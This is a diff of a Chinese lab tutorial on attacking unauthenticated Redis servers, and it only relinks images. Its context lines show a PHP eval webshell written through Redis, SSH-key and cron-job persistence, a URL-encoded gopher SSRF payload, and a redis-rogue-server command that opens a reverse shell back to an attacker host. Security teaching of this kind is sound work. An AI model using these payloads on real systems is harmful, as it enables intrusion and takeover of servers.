@@ -28,7 +28,7 @@ make
 
 当出现`Hint: It's a good idea to run 'make test'`字样时, 编译安装成功.
 
-<div align=center><img src="./Redis%20攻击方式/1.png"></div>
+<div align=center><img src="./images/1.png"></div>
 
 编译安装结束后, 将`src/redis-server`和`src/redis-cli`拷贝到`/usr/bin`目录下(避免每次都进入安装目录启动`redis-server`和`redis-cli`):
 
@@ -49,7 +49,7 @@ sudo cp redis.conf /etc
 sudo redis-server /etc/redis.conf
 ```
 
-<div align=center><img src="./Redis%20攻击方式/2.png"></div>
+<div align=center><img src="./images/2.png"></div>
 
 # Redis 基本用法
 ## redis-cli 命令
@@ -115,7 +115,7 @@ CONFIG GET dir
 CONFIG GET *    // *为获取所有配置项, 这里也可以换成需要查看的配置项
 ```
 
-<div align=center><img src="./Redis%20攻击方式/3.png"></div>
+<div align=center><img src="./images/3.png"></div>
 
 当需要编辑配置文件时, 可以通过修改`redis.conf`文件或使用`CONFIG set`命令来修改配置:
 
@@ -175,7 +175,7 @@ CONFIG set requirepass "20010728"
  - 注释`bind 127.0.0.1 -::1`
  - 将`protected-mode yes`改成`protected-mode no`
 
-<div align=center><img src="./Redis%20攻击方式/4.png"></div>
+<div align=center><img src="./images/4.png"></div>
 
 在攻击机上使用`Redis`客户端直接无账号成功登录受害机上的`Redis`服务端, 并且成功列出服务端`Redis`的信息:
 
@@ -183,7 +183,7 @@ CONFIG set requirepass "20010728"
 redis-cli -h 192.168.249.145
 ```
 
-<div align=center><img src="./Redis%20攻击方式/5.png"></div>
+<div align=center><img src="./images/5.png"></div>
 
 ### 利用 Redis 写入 Webshell
 利用条件:
@@ -205,13 +205,13 @@ set xxx "\r\n\r\n<?php eval($_POST[h3]);?>\r\n\r\n"     // 用redis写入文件�
 save
 ```
 
-<div align=center><img src="./Redis%20攻击方式/6.png"></div>
+<div align=center><img src="./images/6.png"></div>
 
 查看`/var/www/html`, 成功写入`Webshell`.
 
-<div align=center><img src="./Redis%20攻击方式/7.png"></div>
+<div align=center><img src="./images/7.png"></div>
 
-<div align=center><img src="./Redis%20攻击方式/8.png"></div>
+<div align=center><img src="./images/8.png"></div>
 
 ### 利用 Redis 写入 SSH 公钥
 利用条件:
@@ -238,7 +238,7 @@ AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
 sudo /etc/init.d/ssh restart
 ```
 
-<div align=center><img src="./Redis%20攻击方式/9.png"></div>
+<div align=center><img src="./images/9.png"></div>
 
 
  - 在攻击机的`/root/.ssh`目录里生成`ssh`公钥`key`:
@@ -269,7 +269,7 @@ save
 ssh 192.168.249.145
 ```
 
-<div align=center><img src="./Redis%20攻击方式/10.png"></div>
+<div align=center><img src="./images/10.png"></div>
 
 ### 利用 Redis 写入计划任务
 利用原理:
@@ -325,7 +325,7 @@ save
  - 注释`bind 127.0.0.1 -::1`
  - 将`protected-mode yes`改成`protected-mode no`
 
-<div align=center><img src="./Redis%20攻击方式/4.png"></div>
+<div align=center><img src="./images/4.png"></div>
 
 ### 利用 Redis 写入 Webshell
 操作步骤:
@@ -405,7 +405,7 @@ gopher%3A%2F%2F192.168.249.145%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushal
 
  - 查看受害机的`Web`服务器, 成功写入`Webshell`:
 
-<div align=center><img src="./Redis%20攻击方式/11.png"></div>
+<div align=center><img src="./images/11.png"></div>
 
 ### 利用 Redis 写入 SSH 公钥
 和上文提到的利用`Redis`写入`SSH`公钥方法类似, 这里只是利用`Gohper`协议来进行攻击, 这里就不进行具体的演示了, 给出攻击`Payload`:
@@ -539,7 +539,7 @@ gopher%3A%2F%2F192.168.249.145%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushal
 ## Redis 主从复制概念
 主从复制是指将一台`Redis`服务器的数据, 复制到其他的`Redis`服务器. 前者称为`master`(主节点), 后者称为`slave`(从节点). 数据的复制是单向的, 只能由主节点到从节点. 这是一种以空间置换时间的分布式的工作方案, 可以减轻主机缓存压力, 避免单点故障. 通过数据复制, `Redis`的一个`master`可以挂载多个`slave`, 而`slave`下还可以挂载多个`slave`, 形成多层嵌套结构. 所有写操作都在`master`实例中进行, `master`执行完毕后, 将写指令分发给挂在自己下面的`slave`节点. `slave`节点下如果有嵌套的`slave`, 会将收到的写指令进一步分发给挂在自己下面的`slave`.
 
-<div align=center><img src="./Redis%20攻击方式/12.png"></div>
+<div align=center><img src="./images/12.png"></div>
 
 开启主从复制三种方式:
  - 配置文件：在从服务器的配置文件中加入`slaveof <masterip> <masterport>`.
@@ -557,7 +557,7 @@ gopher%3A%2F%2F192.168.249.145%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushal
 
 直接在对应文件夹下执行命令拉取对应漏洞环境: `sudo docker-compose up -d`.
 
-<div align=center><img src="./Redis%20攻击方式/13.png"></div>
+<div align=center><img src="./images/13.png"></div>
 
 ## 漏洞利用工具
 ### redis-rogue-server
@@ -575,9 +575,9 @@ python3 redis-rogue-server.py --rhost 172.21.0.2 --lhost 192.168.249.143
 
 成功执行后, 可以选择获得一个交互式的`shell`(interactive shell)或者是反弹`shell`(reserve shell):
 
-<div align=center><img src="./Redis%20攻击方式/14.png"></div>
+<div align=center><img src="./images/14.png"></div>
 
-<div align=center><img src="./Redis%20攻击方式/15.png"></div>
+<div align=center><img src="./images/15.png"></div>
 
 ### Redis Rogue Server
 下载地址:
